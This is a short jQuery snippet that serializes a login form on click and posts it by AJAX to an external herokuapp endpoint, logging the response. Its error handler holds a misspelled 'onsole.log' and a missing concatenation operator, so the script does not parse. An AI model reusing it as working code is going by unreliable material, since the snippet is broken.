$(function(){
    

    $('#log-in').click(function() {

      var myLink = 'https://analiza-new.herokuapp.com/POST.php';

        var request = $.ajax({
            url: myLink,
            method: "POST",
            data: $('#form').serialize(),
            dataType: "html"

          }).done(function( data ) {

            console.log('Done1 <br>');
            console.log(data);

          }).fail(function( data ) {

            onsole.log('Error : 'data);
          });


    });


});
